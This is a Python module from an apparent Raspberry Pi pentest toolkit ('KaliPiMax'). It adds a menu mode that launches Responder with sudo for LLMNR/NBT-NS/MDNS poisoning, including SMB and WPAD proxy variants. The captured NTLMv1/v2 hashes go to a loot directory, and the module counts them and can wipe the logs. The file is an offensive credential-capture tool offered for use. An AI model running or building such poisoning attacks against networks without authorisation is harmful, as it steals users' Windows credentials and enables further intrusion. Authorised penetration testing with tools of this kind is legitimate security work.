#!/usr/bin/env python3
"""
KaliPiMax Responder Mode
LLMNR/NBT-NS/MDNS poisoning for credential capture.
"""

import subprocess
import os
from PIL import Image

from ui.base_mode import MenuMode
from ui.renderer import Canvas
from core.state import state, AlertLevel
from core.payload import payload_runner, get_loot_path
from config import ETH_INTERFACE, RESPONDER_TIMEOUT, LOOT_DIR


def get_primary_interface() -> str:
    """Get the primary network interface (with default route)."""
    try:
        result = subprocess.run(
            "ip route | grep default | awk '{print $5}' | head -1",
            shell=True, capture_output=True, text=True, timeout=5
        )
        iface = result.stdout.strip()
        return iface if iface else ETH_INTERFACE
    except:
        return ETH_INTERFACE


def is_responder_running() -> bool:
    """Check if Responder is currently running."""
    try:
        result = subprocess.run(
            "pgrep -f 'Responder.py'",
            shell=True, capture_output=True, timeout=2
        )
        return result.returncode == 0
    except:
        return False


def count_captured_hashes() -> int:
    """Count captured NTLM hashes."""
    try:
        # Check both loot dir and Responder's default location
        count = 0
        
        # Our loot directory
        loot_responder = LOOT_DIR / "responder"
        if loot_responder.exists():
            for f in loot_responder.glob("*.log"):
                with open(f, 'r') as file:
                    content = file.read()
                    count += content.count("NTLMv2")
                    count += content.count("NTLMv1")
        
        # Responder's default logs
        responder_logs = "/opt/Responder/logs"
        if os.path.exists(responder_logs):
            for f in os.listdir(responder_logs):
                if "NTLM" in f:
                    count += 1
        
        return count
    except:
        return 0


class ResponderMode(MenuMode):
    """
    Responder credential capture mode.
    
    LLMNR/NBT-NS/MDNS poisoning to capture NTLM hashes.
    """
    
    def __init__(self):
        super().__init__("RESPONDER", "🔓")
        
        self._interface = None
        self._hash_count = 0
        
        self._menu_items = [
            {'icon': '▶', 'text': 'Start Responder', 'action': self._start_responder},
            {'icon': '■', 'text': 'Stop Responder', 'action': self._stop_responder},
            {'icon': '●', 'text': 'Responder + SMB', 'action': self._start_with_smb},
            {'icon': '●', 'text': 'Responder + WPAD', 'action': self._start_with_wpad},
            {'icon': '📄', 'text': 'View Hashes', 'action': self._view_hashes},
            {'icon': '🗑', 'text': 'Clear Logs', 'action': self._clear_logs},
        ]
    
    def on_enter(self):
        super().on_enter()
        self._interface = get_primary_interface()
        self._hash_count = count_captured_hashes()
    
    def _start_responder(self):
        """Start Responder with standard options."""
        outfile = get_loot_path("responder", "responder", "log")
        
        payload_runner.run(
            f"sudo responder -I {self._interface} "
            f"-wrf 2>&1 | tee {outfile}",
            "Responder",
            timeout=RESPONDER_TIMEOUT + 10,
            on_complete=self._refresh_hash_count
        )
    
    def _start_with_smb(self):
        """Start Responder with SMB server enabled."""
        outfile = get_loot_path("responder", "responder_smb", "log")
        
        payload_runner.run(
            f"sudo responder -I {self._interface} "
            f"-wrfbF 2>&1 | tee {outfile}",
            "Responder+SMB",
            timeout=RESPONDER_TIMEOUT + 10,
            on_complete=self._refresh_hash_count
        )
    
    def _start_with_wpad(self):
        """Start Responder with WPAD proxy."""
        outfile = get_loot_path("responder", "responder_wpad", "log")
        
        payload_runner.run(
            f"sudo responder -I {self._interface} "
            f"-wrfP 2>&1 | tee {outfile}",
            "Responder+WPAD",
            timeout=RESPONDER_TIMEOUT + 10,
            on_complete=self._refresh_hash_count
        )
    
    def _stop_responder(self):
        """Stop running Responder instance."""
        payload_runner.run(
            "sudo pkill -9 -f 'Responder.py' || sudo pkill -9 responder",
            "Stop Responder",
            timeout=10
        )
    
    def _view_hashes(self):
        """Show captured hash information."""
        self._refresh_hash_count()
        state.add_alert(f"Captured: {self._hash_count} hashes", AlertLevel.INFO)
        state.add_alert("Loot: ~/kalipimax/loot/responder/", AlertLevel.INFO)
    
    def _clear_logs(self):
        """Clear Responder logs."""
        loot_responder = LOOT_DIR / "responder"
        
        payload_runner.run(
            f"rm -f {loot_responder}/*.log && "
            f"rm -f /opt/Responder/logs/* 2>/dev/null || true",
            "Clear Logs",
            timeout=10,
            on_complete=self._refresh_hash_count
        )
    
    def _refresh_hash_count(self):
        """Refresh the captured hash count."""
        self._hash_count = count_captured_hashes()
        state.render_needed = True
    
    def render(self) -> Image.Image:
        canvas = self._create_canvas()
        
        y = self._render_header(canvas)
        
        # Show interface and status
        is_running = is_responder_running()
        status_text = "RUNNING" if is_running else "STOPPED"
        status_colour = 'ok' if is_running else 'text_dim'
        
        canvas.text(2, y, f"IF: {self._interface}", colour='info', font='tiny')
        canvas.text(70, y, status_text, colour=status_colour, font='tiny')
        y += 10
        
        # Show hash count
        canvas.text(2, y, f"Hashes: {self._hash_count}", colour='highlight', font='tiny')
        y += 10
        
        # Menu
        self._menu.start_y = y
        self._render_menu(canvas, start_y=y)
        
        # self._render_footer(canvas, "K3:Stop/Refresh")
        
        return canvas.get_image()
    
    def on_key3(self):
        """Stop Responder or refresh status."""
        if is_responder_running():
            self._stop_responder()
        else:
            self._interface = get_primary_interface()
            self._refresh_hash_count()
            state.render_needed = True
